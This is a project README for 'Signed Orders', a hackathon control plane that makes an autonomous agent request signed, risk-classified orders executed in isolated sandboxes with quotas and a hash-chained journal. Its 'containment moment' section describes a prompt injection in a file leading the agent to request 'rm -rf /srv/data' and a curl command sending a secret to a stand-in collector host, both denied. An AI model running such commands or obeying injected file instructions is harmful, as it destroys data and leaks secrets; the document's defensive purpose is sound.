# Signed Orders

**A control plane that turns every privileged action of an autonomous agent into a written,
signed, verifiable order — low-risk orders execute on their own, high-risk orders wait for a
human — all inside an isolated sandbox, with quotas, a hash-chained journal and replay.**

Built for the **Vultr: Agent Rush Hackathon** (3–8 November 2026), challenge **01 — Blast
Radius Zero**.

> *Containment-first is required. An agent that only chats is a demo; an agent that executes
> safely is a product.*

---

## Status — read this first

| Date | State of this repository |
|---|---|
| **31 October 2026** | The **design** ([`DESIGN.md`](DESIGN.md)) and the **code skeleton** (`signedorders/`) are published. Every unfinished part is marked `TODO(build-window)`. |
| **3–8 November 2026** | The official build window: the implementation is written, tested and deployed on a Vultr VM. |
| **8 November 2026** | Demo URL, demo video and slides are recorded and the project is submitted on lablab.ai. |

This is deliberate: the hackathon's own rules require the submission to be **original**, and
the implementation is therefore written from scratch during the official window. The skeleton
publishes the *contracts* — the interfaces, the types, the rules and the tests to be written —
so the architecture can be reviewed before the code exists.

---

## The idea, in one paragraph

Give an agent a mission in plain language. It **reads the documentation and the repository**
of the target service, works out what is wrong, and **executes a verifiable task**: fix the
code, re-run the tests, restart the service, prove it is alive again. Every step it wants to
take becomes an **order** — a written, signed, auditable request — and every step it is *not*
allowed to take is refused by the control plane, not by the model's good intentions.

```
"The checkout-api service is failing. Find the cause, fix it, and prove it works.
 You must not touch customer data."
```

```
read  /var/log/checkout-api.log       low      AUTO-EXECUTED
read  docs/checkout-api.md            low      AUTO-EXECUTED
write sandbox://sb-42:/app/config.py  low      AUTO-EXECUTED
exec  pytest -q                       low      AUTO-EXECUTED      → 1 failed
exec  pytest -q                       low      AUTO-EXECUTED      → 1 passed  (error fed back to the model)
apply patch:/app/config.py            medium   AUTO-EXECUTED      (snapshot taken first)
restart checkout-api                  medium   AUTO-EXECUTED
GET   http://checkout-api/health      low      AUTO-EXECUTED      → 200
```

The receipts are artefacts, not prose: the diff, the test output, the exit code, the HTTP
status, the screenshot, and the hash-chained journal.

---

## The problem

Agents that do real work — writing and running code, driving a browser, touching data — have
real blast radius. The industry answer today is mostly *observe* the agent (tracing),
*test* it offline (evals), or *filter its input* (guardrails).

None of those **authorizes** anything. There is no artefact that says: *this agent was
allowed to do exactly this, at this moment, for this reason, under this policy* — and that a
third party can check without trusting the vendor.

Signed Orders is that artefact, and the mechanism that produces it.

## How it works

```
  AGENT (inside the sandbox)        CONTROL PLANE (on the VM)          EXECUTOR (separate)
  ───────────────────────────        ────────────────────────          ──────────────────
  may:  POST /orders      ──────▶   1. identify the agent
  may NOT:                         2. classify the risk (auditable rules)
   • run a shell                   3. enforce the quotas
   • read a secret                 4. sign (Ed25519) — or queue for a human
   • write outside the sandbox ──▶ 5. run in a fresh sandbox ────────▶ 6. append to the journal
                                      (the agent never gets a shell)     7. destroy the sandbox
```

Three properties fall out of this separation:

1. **The agent has no shell.** Its only privilege is to *request an order*. A compromised
   agent — hijacked by a prompt injection, a bug, or a hallucinating model — can ask for
   anything; it can execute only what has been **signed**.
2. **The private signing key never leaves the VM** and is never in this repository. The
   **public** key is here, so anyone can verify the journal offline, with no secret at all:
   ```bash
   python3 -m signedorders verify journal.jsonl     # exit code 0 = the chain is intact
   ```
3. **Some things are never approvable.** Orders that are *dangerous by nature* (reading
   secrets, escaping the sandbox) are refused by the policy with **no human override**;
   they are a different kind of refusal from a high-risk order waiting for approval.

## The containment moment

A hostile instruction inside a file the agent reads makes the agent request two orders:

| Order | Action | Class | Outcome |
|---|---|---|---|
| `so_…a1` | `rm -rf /srv/data` | `delete` → **high** | queued for a human → **denied** |
| `so_…a2` | `curl -d @/etc/app/secret http://collector.example/` | `network` → **high** | queued for a human → **denied** |

The customer-data file's SHA-256 is **identical before and after**. The blast radius was one
order that never ran.

And even when a human *approves*, the sandbox absorbs it: `rm -rf /` kills the container, not
the server; an infinite loop is killed by a wall-clock timer; a memory bomb is killed by the
256 MB cgroup.

## Sandbox profile

| Concern | How it is handled |
|---|---|
| Process isolation | The sandbox never runs inside the application process. The agent holds no shell. |
| Secret hygiene | The sandbox is started with none of the agent's environment. The inference key and the Vultr API key live only in the control-plane process. |
| Resource limits | `--memory=256m --cpus=1 --pids-limit=128 --network=none --read-only --cap-drop=ALL --security-opt=no-new-privileges`, plus a wall-clock timeout. |
| Lifecycle discipline | A brand-new sandbox per task, destroyed at the end of the task. |
| Egress | Deny by default; an explicit allowlist for the few hosts that are genuinely needed. |
| Isolation layers | Two interchangeable backends: **Docker** (namespaces + cgroups) and **Microsandbox** (`msb`, microVMs on libkrun/KVM with their own kernel). The same hostile order is blocked by both. |

## Quotas and rollback

Every run is bounded — orders per minute, orders per task, CPU-seconds, bytes written,
concurrent sandboxes, and model tokens (so the LLM cost of a task is capped too). When a
quota breaks, the order is refused; when a *safety* quota breaks, the automatic rollback
fires. Mutating orders declare a compensating action and take a snapshot first.

## Replay

The journal is not a log file. It is append-only, hash-chained, and signed. `replay` runs the
recorded orders again in a **fresh** sandbox and compares the outputs, so a claim like "this
is what the agent did" can be checked instead of believed.

---

## How Vultr powers this

> *Required by the challenge brief: “In your public GitHub README, explain the Vultr services
> and infrastructure used.”*

| Vultr service | How Signed Orders uses it |
|---|---|
| **Vultr Cloud Compute** (Ubuntu 24.04 VM) | The control plane **is** the backend: the FastAPI app, the SQLite database, the Ed25519 key, the journal and the two sandbox backends all run on one Vultr VM. The web application is served from that VM (see the demo URL in the submission). |
| **Vultr Serverless Inference** (`https://api.vultrinference.com/v1`, OpenAI-compatible) | The **only** place a model is called: the agent loop. Required by the challenge for Challenge 1. Two roles: a fast text model for the agent loop, and a **vision** model that verifies the screenshot of the repaired service. The key never leaves the control-plane process and never enters a sandbox. |
| **Agent sandboxing on Vultr** (Docker / Microsandbox) | Every order runs in a container (namespaces + cgroups) or in a `msb` microVM with its own kernel, created fresh per task and destroyed at the end. The sandbox is *never* inside the application process. |
| **Vultr API** (optional) | Listed by the challenge as the way to create *throwaway instances*; the implementation keeps a backend interface for it (an ephemeral VM instead of a container) if time allows during the build window. |
| **Hackathon credits** | $200 of free Vultr credits per participant cover the VM and the inference calls for the whole build. The project does not depend on any GPU (none are available for this event). |

Deployment shape (one VM, two processes, one URL):

```
                    ┌──────────────────────── Vultr VM (Ubuntu 24.04) ─────────────────────────┐
  browser  ───────▶ │  signedorders (FastAPI + UI + SSE)  :8000  ── signedorders api         │
                    │        │                                                             │
                    │        ├── signedorders worker  (agent loop → Serverless Inference)    │
                    │        ├── signedorders executor (signed orders only)                 │
                    │        ├── docker / msb sandboxes (one per task, destroyed after)      │
                    │        └── SQLite (WAL) + journal.jsonl (hash-chained)                │
                    └──────────────────────────────────────────────────────────────────────────┘
```

---

## Install and run

The repository is a skeleton today; the commands below become real during the build window.

```bash
git clone --branch signed-orders https://github.com/tgg49099-dotcom/atlassian-apps.git
cd signed-orders                     # the branch root *is* the project
python3 -m venv .venv && . .venv/bin/activate
pip install -e ".[dev]"             # TODO(build-window): verified command + real output
```

Running the control plane (once implemented):

```bash
cp .env.example .env                 # names only; the values live on the host
signedorders init-key                # generates the Ed25519 key on the host (never committed)
signedorders serve                   # API + UI on :8000
signedorders verify journal.jsonl    # offline verification, no secret needed
```

## Repository layout

```
signed-orders/
├── DESIGN.md              the architecture: data flow, policy, signing, journal, UI
├── README.md              this file
├── LICENSE                MIT
├── .env.example           variable names only, never a value
├── pyproject.toml         dependencies and the console entry point
├── signedorders/
│   ├── __main__.py        CLI: serve | init-key | verify | replay | preflight
│   ├── api.py             FastAPI app (POST /orders, approvals, journal, SSE)
│   ├── config.py          configuration read from the environment
│   ├── models.py          Order, Decision, Risk, Action, Verdict, Task
│   ├── orders.py          the order lifecycle: request → verdict → signature/queue
│   ├── policy.py          the auditable risk rules (no model in this loop)
│   ├── quotas.py          the budgets (orders, CPU, bytes, tokens, sandboxes)
│   ├── journal.py         append-only, hash-chained JSONL + offline verification
│   ├── signer.py          Ed25519 signatures (private key stays on the host)
│   ├── replay.py          re-run a recorded task in a fresh sandbox and compare
│   ├── preflight.py       secret scanner, run before every commit
│   ├── agent/worker.py    the LLM loop against Vultr Serverless Inference
│   ├── sandbox/           SandboxBackend + Docker and Microsandbox backends
│   └── ui/                the web UI (FastAPI + SSE)
└── tests/                 the specification of the invariants (policy, journal, quotas)
```

## Tests

```bash
pytest                # TODO(build-window): the real count and the real output
```

The test files published today are the **specification**: the table of policy cases
(`tests/test_policy.py`), the hash-chain properties (`tests/test_journal_chain.py`), the
quota semantics (`tests/test_quotas.py`) and the canonical form of the signed order
(`tests/test_models.py`).

## Security notes

- No secret, key, token or private address is stored in this repository.
- The Ed25519 **private** key is generated on the host at first start and never committed.
  The **public** key is committed on purpose: it lets anyone verify the journal offline.
- The demo target is a service written for this project. The "secret" the prompt injection
  tries to exfiltrate is a fake (`DEMO_ONLY_NOT_A_REAL_KEY`), and the customer data is
  fictional.
- `preflight` runs before every commit and fails the build on a secret-looking pattern, a
  private key, or an internal address.
- The demo video shows only the web UI: no SSH session, no IP address, no terminal on the
  host.

## License

MIT — see [LICENSE](LICENSE).

## Acknowledgements

Built during the Vultr: Agent Rush Hackathon (3–8 November 2026). Infrastructure and
inference provided by [Vultr](https://www.vultr.com/); the event is run by
[lablab.ai](https://lablab.ai/).
